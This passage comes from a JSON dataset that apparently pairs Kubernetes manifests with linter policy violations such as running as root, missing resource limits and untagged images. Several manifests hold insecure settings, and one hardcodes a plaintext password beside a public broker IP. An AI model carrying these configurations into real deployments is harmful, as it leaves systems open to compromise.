LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 78ee09edfc1815a0057f1df4a3749b0dba55c117\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-tekton-controller\" not found"
  },
  {
    "id": "11330",
    "manifest_path": "data/manifests/the_stack_sample/sample_4368.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.1.51\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: 1fd0005407ac7f67ebab2661d3da5128baef8d555cbbf8f197066258f8b8f406\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.1.51\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.192.168.71.62.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.51\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 78ee09edfc1815a0057f1df4a3749b0dba55c117\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-tekton-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "11331",
    "manifest_path": "data/manifests/the_stack_sample/sample_4369.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: dbrpc\n  name: dbrpc\n  namespace: prod\nspec:\n  ports:\n  - name: http\n    port: 8079\n    targetPort: 8079\n  selector:\n    app: dbrpc\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:dbrpc])"
  },
  {
    "id": "11332",
    "manifest_path": "data/manifests/the_stack_sample/sample_4371.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: email-depl\nspec:\n  selector:\n    matchLabels:\n      app: email\n  template:\n    metadata:\n      labels:\n        app: email\n    spec:\n      containers:\n      - name: email\n        image: sluis117/emails\n        env:\n        - name: SENGRID_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_API_KEY\n        - name: SENGRID_TEMPLATE\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_TEMPLATE\n        - name: SENGRD_FROM\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRD_FROM\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NATS_URL\n          value: http://nats-srv:4222\n        - name: NATS_CLUSTER_ID\n          value: shopGt\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"email\" is using an invalid container image, \"sluis117/emails\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11333",
    "manifest_path": "data/manifests/the_stack_sample/sample_4371.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: email-depl\nspec:\n  selector:\n    matchLabels:\n      app: email\n  template:\n    metadata:\n      labels:\n        app: email\n    spec:\n      containers:\n      - name: email\n        image: sluis117/emails\n        env:\n        - name: SENGRID_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_API_KEY\n        - name: SENGRID_TEMPLATE\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_TEMPLATE\n        - name: SENGRD_FROM\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRD_FROM\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NATS_URL\n          value: http://nats-srv:4222\n        - name: NATS_CLUSTER_ID\n          value: shopGt\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"email\" does not have a read-only root file system"
  },
  {
    "id": "11334",
    "manifest_path": "data/manifests/the_stack_sample/sample_4371.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: email-depl\nspec:\n  selector:\n    matchLabels:\n      app: email\n  template:\n    metadata:\n      labels:\n        app: email\n    spec:\n      containers:\n      - name: email\n        image: sluis117/emails\n        env:\n        - name: SENGRID_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_API_KEY\n        - name: SENGRID_TEMPLATE\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_TEMPLATE\n        - name: SENGRD_FROM\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRD_FROM\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NATS_URL\n          value: http://nats-srv:4222\n        - name: NATS_CLUSTER_ID\n          value: shopGt\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"email\" is not set to runAsNonRoot"
  },
  {
    "id": "11335",
    "manifest_path": "data/manifests/the_stack_sample/sample_4371.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: email-depl\nspec:\n  selector:\n    matchLabels:\n      app: email\n  template:\n    metadata:\n      labels:\n        app: email\n    spec:\n      containers:\n      - name: email\n        image: sluis117/emails\n        env:\n        - name: SENGRID_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_API_KEY\n        - name: SENGRID_TEMPLATE\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_TEMPLATE\n        - name: SENGRD_FROM\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRD_FROM\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NATS_URL\n          value: http://nats-srv:4222\n        - name: NATS_CLUSTER_ID\n          value: shopGt\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"email\" has cpu request 0"
  },
  {
    "id": "11336",
    "manifest_path": "data/manifests/the_stack_sample/sample_4371.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: email-depl\nspec:\n  selector:\n    matchLabels:\n      app: email\n  template:\n    metadata:\n      labels:\n        app: email\n    spec:\n      containers:\n      - name: email\n        image: sluis117/emails\n        env:\n        - name: SENGRID_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_API_KEY\n        - name: SENGRID_TEMPLATE\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRID_TEMPLATE\n        - name: SENGRD_FROM\n          valueFrom:\n            secretKeyRef:\n              name: sendgrid-secret\n              key: SENGRD_FROM\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: NATS_URL\n          value: http://nats-srv:4222\n        - name: NATS_CLUSTER_ID\n          value: shopGt\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"email\" has memory limit 0"
  },
  {
    "id": "11337",
    "manifest_path": "data/manifests/the_stack_sample/sample_4372.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recive-hello2\n  namespace: recivers\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: recive-hello2\n  template:\n    metadata:\n      labels:\n        app: recive-hello2\n    spec:\n      containers:\n      - name: recive\n        image: wbe7/recive-rabbit:v0.6\n        env:\n        - name: QUEUE\n          value: hello2\n        - name: LOGIN\n          value: wbe7\n        - name: PASSWORD\n          value: mindbox123\n        - name: BROKER\n          value: 34.89.173.76:5672\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11338",
    "manifest_path": "data/manifests/the_stack_sample/sample_4372.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recive-hello2\n  namespace: recivers\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: recive-hello2\n  template:\n    metadata:\n      labels:\n        app: recive-hello2\n    spec:\n      containers:\n      - name: recive\n        image: wbe7/recive-rabbit:v0.6\n        env:\n        - name: QUEUE\n          value: hello2\n        - name: LOGIN\n          value: wbe7\n        - name: PASSWORD\n          value: mindbox123\n        - name: BROKER\n          value: 34.89.173.76:5672\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"recive\" does not have a read-only root file system"
  },
  {
    "id": "11339",
    "manifest_path": "data/manifests/the_stack_sample/sample_4372.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recive-hello2\n  namespace: recivers\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: recive-hello2\n  template:\n    metadata:\n      labels:\n        app: recive-hello2\n    spec:\n      containers:\n      - name: recive\n        image: wbe7/recive-rabbit:v0.6\n        env:\n        - name: QUEUE\n          value: hello2\n        - name: LOGIN\n          value: wbe7\n        - name: PASSWORD\n          value: mindbox123\n        - name: BROKER\n          value: 34.89.173.76:5672\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"recive\" is not set to runAsNonRoot"
  },
  {
    "id": "11340",
    "manifest_path": "data/manifests/the_stack_sample/sample_4372.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recive-hello2\n  namespace: recivers\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: recive-hello2\n  template:\n    metadata:\n      labels:\n        app: recive-hello2\n    spec:\n      containers:\n      - name: recive\n        image: wbe7/recive-rabbit:v0.6\n        env:\n        - name: QUEUE\n          value: hello2\n        - name: LOGIN\n          value: wbe7\n        - name: PASSWORD\n          value: mindbox123\n        - name: BROKER\n          value: 34.89.173.76:5672\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"recive\" has cpu request 0"
  },
  {
    "id": "11341",
    "manifest_path": "data/manifests/the_stack_sample/sample_4372.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recive-hello2\n  namespace: recivers\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: recive-hello2\n  template:\n    metadata:\n      labels:\n        app: recive-hello2\n    spec:\n      containers:\n      - name: recive\n        image: wbe7/recive-rabbit:v0.6\n        env:\n        - name: QUEUE\n          value: hello2\n        - name: LOGIN\n          value: wbe7\n        - name: PASSWORD\n          value: mindbox123\n        - name: BROKER\n          value: 34.89.173.76:5672\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"recive\" has memory limit 0"
  },
  {
    "id": "11342",
    "manifest_path": "data/manifests/the_stack_sample/sample_4374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: anchor-ip-annotator\n  labels:\n    app.kubernetes.io/name: do-floating-ip\n    app.kubernetes.io/component: annotator\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: do-floating-ip\n      app.kubernetes.io/component: annotator\n  template:\n    metadata:\n      name: anchor-ip-annotator\n      labels:\n        app.kubernetes.io/name: do-floating-ip\n        app.kubernetes.io/component: annotator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: k8s.haim.dev/digital-ocean-anchor-ip\n                operator: DoesNotExist\n      containers:\n      - name: anchor-ip-annotator\n        image: ghcr.io/haimgel/do-floating-ip:main\n        imagePullPolicy: Always\n        command:\n        - /app/anchor-ip-annotator\n        resources: {}\n      serviceAccount: do-floating-ip\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (do-floating-ip), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "11343",
    "manifest_path": "data/manifests/the_stack_sample/sample_4374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: anchor-ip-annotator\n  labels:\n    app.kubernetes.io/name: do-floating-ip\n    app.kubernetes.io/component: annotator\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: do-floating-ip\n      app.kubernetes.io/component: annotator\n  template:\n    metadata:\n      name: anchor-ip-annotator\n      labels:\n        app.kubernetes.io/name: do-floating-ip\n        app.kubernetes.io/component: annotator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: k8s.haim.dev/digital-ocean-anchor-ip\n                operator: DoesNotExist\n      containers:\n      - name: anchor-ip-annotator\n        image: ghcr.io/haimgel/do-floating-ip:main\n        imagePullPolicy: Always\n        command:\n        - /app/anchor-ip-annotator\n        resources: {}\n      serviceAccount: do-floating-ip\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"anchor-ip-annotator\" does not have a read-only root file system"
  },
  {
    "id": "11344",
    "manifest_path": "data/manifests/the_stack_sample/sample_4374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: anchor-ip-annotator\n  labels:\n    app.kubernetes.io/name: do-floating-ip\n    app.kubernetes.io/component: annotator\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: do-floating-ip\n      app.kubernetes.io/component: annotator\n  template:\n    metadata:\n      name: anchor-ip-annotator\n      labels:\n        app.kubernetes.io/name: do-floating-ip\n        app.kubernetes.io/component: annotator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: k8s.haim.dev/digital-ocean-anchor-ip\n                operator: DoesNotExist\n      containers:\n      - name: anchor-ip-annotator\n        image: ghcr.io/haimgel/do-floating-ip:main\n        imagePullPolicy: Always\n        command:\n        - /app/anchor-ip-annotator\n        resources: {}\n      serviceAccount: do-floating-ip\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"do-floating-ip\" not found"
  },
  {
    "id": "11345",
    "manifest_path": "data/manifests/the_stack_sample/sample_4374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: anchor-ip-annotator\n  labels:\n    app.kubernetes.io/name: do-floating-ip\n    app.kubernetes.io/component: annotator\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: do-floating-ip\n      app.kubernetes.io/component: annotator\n  template:\n    metadata:\n      name: anchor-ip-annotator\n      labels:\n        app.kubernetes.io/name: do-floating-ip\n        app.kubernetes.io/component: annotator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: k8s.haim.dev/digital-ocean-anchor-ip\n                operator: DoesNotExist\n      containers:\n      - name: anchor-ip-annotator\n        image: ghcr.io/haimgel/do-floating-ip:main\n        imagePullPolicy: Always\n        command:\n        - /app/anchor-ip-annotator\n        resources: {}\n      serviceAccount: do-floating-ip\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"anchor-ip-annotator\" is not set to runAsNonRoot"
  },
  {
    "id": "11346",
    "manifest_path": "data/manifests/the_stack_sample/sample_4374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: anchor-ip-annotator\n  labels:\n    app.kubernetes.io/name: do-floating-ip\n    app.kubernetes.io/component: annotator\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: do-floating-ip\n      app.kubernetes.io/component: annotator\n  template:\n    metadata:\n      name: anchor-ip-annotator\n      labels:\n        app.kubernetes.io/name: do-floating-ip\n        app.kubernetes.io/component: annotator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: k8s.haim.dev/digital-ocean-anchor-ip\n                operator: DoesNotExist\n      containers:\n      - name: anchor-ip-annotator\n        image: ghcr.io/haimgel/do-floating-ip:main\n        imagePullPolicy: Always\n        command:\n        - /app/anchor-ip-annotator\n        resources: {}\n      serviceAccount: do-floating-ip\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"anchor-ip-annotator\" has cpu request 0"
  },
  {
    "id": "11347",
    "manifest_path": "data/manifests/the_stack_sample/sample_4374.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: anchor-ip-annotator\n  labels:\n    app.kubernetes.io/name: do-floating-ip\n    app.kubernetes.io/component: annotator\n  namespace: default\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: do-floating-ip\n      app.kubernetes.io/component: annotator\n  template:\n    metadata:\n      name: anchor-ip-annotator\n      labels:\n        app.kubernetes.io/name: do-floating-ip\n        app.kubernetes.io/component: annotator\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: k8s.haim.dev/digital-ocean-anchor-ip\n                operator: DoesNotExist\n      containers:\n      - name: anchor-ip-annotator\n        image: ghcr.io/haimgel/do-floating-ip:main\n        imagePullPolicy: Always\n        command:\n        - /app/anchor-ip-annotator\n        resources: {}\n      serviceAccount: do-floating-ip\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"anchor-ip-annotator\" has memory limit 0"
  },
  {
    "id": "11348",
    "manifest_path": "data/manifests/the_stack_sample/sample_4375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: f5cis1\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr-deployment\n  template:\n    metadata:\n      labels:\n        app: k8s-bigip-ctlr-deployment\n    spec:\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.6.1\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=10.0.1.4\n        - --gtm-bigip-username=$(BIGIP_USERNAME)\n        - --gtm-bigip-password=$(BIGIP_PASSWORD)\n        - --gtm-bigip-url=10.0.1.4\n        - --bigip-partition=kubernetes\n        - --pool-member-type=cluster\n        - --insecure\n        - --custom-resource-mode=true\n        - --log-level=DEBUG\n        - --ipam=true\n      serviceAccount: bigip-ctlr\n      serviceAccountName: bigip-ctlr\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"k8s-bigip-ctlr\" does not have a read-only root file system"
  },
  {
    "id": "11349",
    "manifest_path": "data/manifests/the_stack_sample/sample_4375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: f5cis1\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr-deployment\n  template:\n    metadata:\n      labels:\n        app: k8s-bigip-ctlr-deployment\n    spec:\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.6.1\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=10.0.1.4\n        - --gtm-bigip-username=$(BIGIP_USERNAME)\n        - --gtm-bigip-password=$(BIGIP_PASSWORD)\n        - --gtm-bigip-url=10.0.1.4\n        - --bigip-partition=kubernetes\n        - --pool-member-type=cluster\n        - --insecure\n        - --custom-resource-mode=true\n        - --log-level=DEBUG\n        - --ipam=true\n      serviceAccount: bigip-ctlr\n      serviceAccountName: bigip-ctlr\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"bigip-ctlr\" not found"
  },
  {
    "id": "11350",
    "manifest_path": "data/manifests/the_stack_sample/sample_4375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: f5cis1\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr-deployment\n  template:\n    metadata:\n      labels:\n        app: k8s-bigip-ctlr-deployment\n    spec:\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.6.1\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=10.0.1.4\n        - --gtm-bigip-username=$(BIGIP_USERNAME)\n        - --gtm-bigip-password=$(BIGIP_PASSWORD)\n        - --gtm-bigip-url=10.0.1.4\n        - --bigip-partition=kubernetes\n        - --pool-member-type=cluster\n        - --insecure\n        - --custom-resource-mode=true\n        - --log-level=DEBUG\n        - --ipam=true\n      serviceAccount: bigip-ctlr\n      serviceAccountName: bigip-ctlr\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"k8s-bigip-ctlr\" is not set to runAsNonRoot"
  },
  {
    "id": "11351",
    "manifest_path": "data/manifests/the_stack_sample/sample_4375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: f5cis1\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr-deployment\n  template:\n    metadata:\n      labels:\n        app: k8s-bigip-ctlr-deployment\n    spec:\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.6.1\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=10.0.1.4\n        - --gtm-bigip-username=$(BIGIP_USERNAME)\n        - --gtm-bigip-password=$(BIGIP_PASSWORD)\n        - --gtm-bigip-url=10.0.1.4\n        - --bigip-partition=kubernetes\n        - --pool-member-type=cluster\n        - --insecure\n        - --custom-resource-mode=true\n        - --log-level=DEBUG\n        - --ipam=true\n      serviceAccount: bigip-ctlr\n      serviceAccountName: bigip-ctlr\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"k8s-bigip-ctlr\" has cpu request 0"
  },
  {
    "id": "11352",
    "manifest_path": "data/manifests/the_stack_sample/sample_4375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: f5cis1\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: k8s-bigip-ctlr-deployment\n  template:\n    metadata:\n      labels:\n        app: k8s-bigip-ctlr-deployment\n    spec:\n      containers:\n      - name: k8s-bigip-ctlr\n        image: f5networks/k8s-bigip-ctlr:2.6.1\n        env:\n        - name: BIGIP_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: username\n        - name: BIGIP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: bigip-login\n              key: password\n        command:\n        - /app/bin/k8s-bigip-ctlr\n        args:\n        - --bigip-username=$(BIGIP_USERNAME)\n        - --bigip-password=$(BIGIP_PASSWORD)\n        - --bigip-url=10.0.1.4\n        - --gtm-bigip-username=$(BIGIP_USERNAME)\n        - --gtm-bigip-password=$(BIGIP_PASSWORD)\n        - --gtm-bigip-url=10.0.1.4\n        - --bigip-partition=kubernetes\n        - --pool-member-type=cluster\n        - --insecure\n        - --custom-resource-mode=true\n        - --log-level=DEBUG\n        - --ipam=true\n      serviceAccount: bigip-ctlr\n      serviceAccountName: bigip-ctlr\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"k8s-bigip-ctlr\" has memory limit 0"
  },
  {
    "id": "11353",
    "manifest_path": "data/manifests/the_stack_sample/sample_4376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: statefulset\nspec:\n  selector:\n    matchLabels:\n      app: statefulset\n  template:\n    metadata:\n      labels:\n        app: statefulset\n    spec:\n      containers:\n      - name: statefulset\n        image: nonexisting\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"statefulset\" is using an invalid container image, \"nonexisting\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11354",
    "manifest_path": "data/manifests/the_stack_sample/sample_4376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: statefulset\nspec:\n  selector:\n    matchLabels:\n      app: statefulset\n  template:\n    metadata:\n      labels:\n        app: statefulset\n    spec:\n      containers:\n      - name: statefulset\n        image: nonexisting\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statefulset\" does not have a read-only root file system"
  },
  {
    "id": "11355",
    "manifest_path": "data/manifests/the_stack_sample/sample_4376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: statefulset\nspec:\n  selector:\n    matchLabels:\n      app: statefulset\n  template:\n    metadata:\n      labels:\n        app: statefulset\n    spec:\n      containers:\n      - name: statefulset\n        image: nonexisting\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statefulset\" is not set to runAsNonRoot"
  },
  {
    "id": "11356",
    "manifest_path": "data/manifests/the_stack_sample/sample_4376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: statefulset\nspec:\n  selector:\n    matchLabels:\n      app: statefulset\n  template:\n    metadata:\n      labels:\n        app: statefulset\n    spec:\n      containers:\n      - name: statefulset\n        image: nonexisting\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statefulset\" has cpu request 0"
  },
  {
    "id": "11357",
    "manifest_path": "data/manifests/the_stack_sample/sample_4376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: statefulset\nspec:\n  selector:\n    matchLabels:\n      app: statefulset\n  template:\n    metadata:\n      labels:\n        app: statefulset\n    spec:\n      containers:\n      - name: statefulset\n        image: nonexisting\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statefulset\" has memory limit 0"
  },
  {
    "id": "11358",
    "manifest_path": "data/manifests/the_stack_sample/sample_4377.yaml",
